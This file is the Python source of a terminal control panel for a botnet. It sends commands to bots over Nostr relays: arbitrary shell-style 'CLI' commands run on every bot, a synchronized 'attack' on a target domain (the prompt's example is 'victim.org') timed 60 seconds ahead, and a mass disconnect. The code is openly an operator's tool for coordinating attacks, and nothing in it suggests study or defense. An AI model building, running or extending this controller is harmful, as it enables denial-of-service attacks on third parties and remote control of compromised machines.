import time, curses

import connection as nostr_connection 


#
#   USER INTERFACE
#
BUTTON_GAP   = 2
BUTTON_WIDTH = 12
INPUT_ATTR   = curses.A_REVERSE
LABELS       = [ "   CLI   ", " ATTACK ", " DISCON " ]
HELP_TEXT    = "Tab to switch, q to quit, enter to select"
PUBLIC_KEY   = "a4d8b4ace206457659ab258557382af7eb52db23438ea8a11976a3f08c735dbe"
PUBLIC_TEXT  = "PublicKey"
PROMPTS      = [ "Enter CLI command that plays on the bots.",
                 "Enter attack target domain. Example: victim.org",]
RELAYS_TEXT  = "Relays"
RELAYS_VALUE = "0"


def center_x( width : int, text : str ) -> int:
    return max( 0, ( width - len( text ) ) // 2 )


def initialize_colors():
    global INPUT_ATTR

    if not curses.has_colors():
        return

    curses.start_color()
    curses.use_default_colors()

    try:
        background = curses.COLOR_WHITE
        if getattr( curses, "COLORS", 0 ) > 236:
            background = 236
        elif getattr( curses, "COLORS", 0 ) > 8:
            background = 8

        curses.init_pair( 1, curses.COLOR_BLACK, background )
        INPUT_ATTR = curses.color_pair( 1 )
    except curses.error:
        INPUT_ATTR = curses.A_REVERSE


def draw_button( stdscr, y : int, x : int, width : int, label : str, focused : bool = False ):
    attr = curses.A_REVERSE if focused else curses.A_NORMAL
    stdscr.addstr( y, x, label.center( width ), attr )


def draw_main_screen( stdscr, focused_index : int ):
    stdscr.clear()
    height, width = stdscr.getmaxyx()
    button_width  = len( LABELS ) * BUTTON_WIDTH + ( len( LABELS ) - 1 ) * BUTTON_GAP
    status_width  = max(
        len( RELAYS_TEXT ) + 1 + len( RELAYS_VALUE ),
        len( PUBLIC_TEXT ) + 1 + len( PUBLIC_KEY ),
        len( HELP_TEXT ),
    )
    total_width   = max( button_width, status_width )
    button_y      = max( 0, height // 2 )
    block_x       = max( 0, ( width - total_width ) // 2 )
    button_x      = block_x + max( 0, ( total_width - button_width ) // 2 )
    divider       = "─" * total_width
    value_right   = block_x + total_width
    relays_x      = value_right - len( RELAYS_VALUE )
    public_key_x  = value_right - len( PUBLIC_KEY )

    stdscr.addstr( max( 0, button_y - 3 ), block_x, RELAYS_TEXT, curses.A_BOLD )
    stdscr.addstr( max( 0, button_y - 3 ), relays_x, RELAYS_VALUE )
    stdscr.addstr( max( 0, button_y - 2 ), block_x, PUBLIC_TEXT, curses.A_BOLD )
    stdscr.addstr( max( 0, button_y - 2 ), public_key_x, PUBLIC_KEY )
    stdscr.addstr( max( 0, button_y - 1 ), block_x, divider )

    for index, label in enumerate( LABELS ):
        x = button_x + index * ( BUTTON_WIDTH + BUTTON_GAP )
        draw_button( stdscr, button_y, x, BUTTON_WIDTH, label, focused = index == focused_index )

    stdscr.addstr( button_y + 2, block_x, HELP_TEXT )
    stdscr.refresh()


def edit_input( stdscr, title : str, prompt : str, value : str ):
    """
    Renders a blocking input view and returns the saved value.
    """
    curses.curs_set( 1 )
    text = value

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        title_text    = title.strip()
        help_text     = "Type to edit, Enter to save, Esc to cancel"
        target_width  = max( len( prompt ), len( help_text ) ) + 2
        field_width   = min( max( 20, len( text ) + 2, target_width ), max( 20, width - 10 ) )
        field_y       = height // 2
        field_x       = max( 0, ( width - field_width ) // 2 )
        visible_text  = text[: field_width - 2 ]

        stdscr.addstr( max( 0, field_y - 4 ), center_x( width, title_text ), title_text )
        stdscr.addstr( max( 0, field_y - 2 ), center_x( width, prompt ), prompt )
        stdscr.addstr( max( 0, field_y - 1 ), center_x( width, help_text ), help_text )
        stdscr.addstr( field_y, field_x, "[" + " " * ( field_width - 2 ) + "]", INPUT_ATTR )
        stdscr.addstr( field_y, field_x + 1, visible_text, INPUT_ATTR )
        stdscr.move( field_y, field_x + 1 + len( visible_text ) )
        stdscr.refresh()

        key = stdscr.getch()
        if key == 27:
            curses.curs_set( 0 )
            return None

        if key in ( 10, 13, curses.KEY_ENTER ):
            curses.curs_set( 0 )
            return text

        if key in ( curses.KEY_BACKSPACE, 127, 8 ):
            text = text[:-1]
            continue

        if 32 <= key <= 126:
            text += chr( key )


def confirm_disconnect( stdscr ):
    options        = [ "Yes", "No" ]
    selected_index = 1
    curses.curs_set( 0 )

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        title         = "Disconnect bots."
        prompt        = "Are you sure? This will disconnect ALL bots from the network."
        help_text     = "\n"
        option_y      = height // 2
        option_gap    = 4
        total_width   = sum( len( option ) + 2 for option in options ) + option_gap
        start_x       = max( 0, ( width - total_width ) // 2 )

        stdscr.addstr( max( 0, option_y - 4 ), center_x( width, title ), title )
        stdscr.addstr( max( 0, option_y - 2 ), center_x( width, prompt ), prompt )
        stdscr.addstr( max( 0, option_y - 1 ), center_x( width, help_text ), help_text )

        x = start_x
        for index, option in enumerate( options ):
            attr = curses.A_REVERSE if index == selected_index else curses.A_NORMAL
            text = f"[ {option} ]"
            stdscr.addstr( option_y, x, text, attr )
            x += len( text ) + option_gap

        stdscr.refresh()

        key = stdscr.getch()
        if key == 27:
            return None

        if key in ( 10, 13, curses.KEY_ENTER ):
            return options[ selected_index ]

        if key in ( 9, curses.KEY_RIGHT ):
            selected_index = ( selected_index + 1 ) % len( options )
        elif key in ( curses.KEY_BTAB, curses.KEY_LEFT ):
            selected_index = ( selected_index - 1 ) % len( options )


def show_sending( stdscr ):
    stdscr.clear()
    height, width = stdscr.getmaxyx()
    text = "sending..."
    stdscr.addstr( height // 2, center_x( width, text ), text )
    stdscr.refresh()


def main( stdscr ):
    initialize_colors()
    curses.curs_set( 0 )
    stdscr.keypad( True )

    focused_index = 0
    values        = [ "", "", "" ]

    while True:
        draw_main_screen( stdscr, focused_index )
        key = stdscr.getch()

        if key in ( ord( "q" ), 27 ):
            break

        if key in ( 9, curses.KEY_RIGHT ):
            focused_index = ( focused_index + 1 ) % len( LABELS )
            continue

        if key in ( curses.KEY_BTAB, curses.KEY_LEFT ):
            focused_index = ( focused_index - 1 ) % len( LABELS )
            continue

        if key not in ( 10, 13, curses.KEY_ENTER ):
            continue

        if focused_index == 2:
            values[ focused_index ] = confirm_disconnect( stdscr ) or values[ focused_index ]
            if values[ focused_index ] == "Yes":
                show_sending( stdscr )
                disconnect( values[ focused_index ] )
            continue

        user_input = edit_input(
            stdscr,
            LABELS[ focused_index ],
            PROMPTS[ focused_index ],
            values[ focused_index ],
        )

        if user_input == None:
            continue

        values[ focused_index ] = user_input

        if values[ focused_index ].strip() == "":
            continue

        if focused_index == 0:
            show_sending( stdscr )
            cli_command( values[ focused_index ] )
        elif focused_index == 1:
            show_sending( stdscr )
            attack_command( values[ focused_index ] )


#
#   ACTIONS / COMMANDS
#
def cli_command( user_input ):
    # CLI command can be sent as is.
    nostr_connection.send_payload({
        "args"    : user_input,
        "command" : "cli"    
    })
    
def attack_command( user_input ):
    # attack command requires a CSV format: 
    # "VICTIM,TIMESTAMP" because of the heartbeat.
    # Not every bot will receive the command at the
    # same time, which we can remedy by setting 
    # a unix timestamp as the "goal" for the time
    # of the attack.
    nostr_connection.send_payload({
        "args"    : user_input + "," + str( time.time() + 60 ),
        "command" : "attack"    
    })

def disconnect( _ ):
    # No user input required ; ignore it.
    nostr_connection.send_payload({
        "args"    : "_",
        "command" : "disconnect"    
    })
    
    # After connection, 
    # all bots connecting are gonna disconnect upon new entry.
    # If you wish to start the net again, send a padding:
    #nostr_connection.send_payload({ "padding" : "padding" })
     

if __name__ == "__main__":
    # Initialize nostr connection
    nostr_connection.main( "./relays.txt" )
    
    from connection import RELAYS, PUBLIC_KEY as PKEY
    RELAYS_VALUE = str(len( RELAYS ))
    PUBLIC_KEY   = PKEY
    
    # Initialize TUI
    curses.wrapper( main )
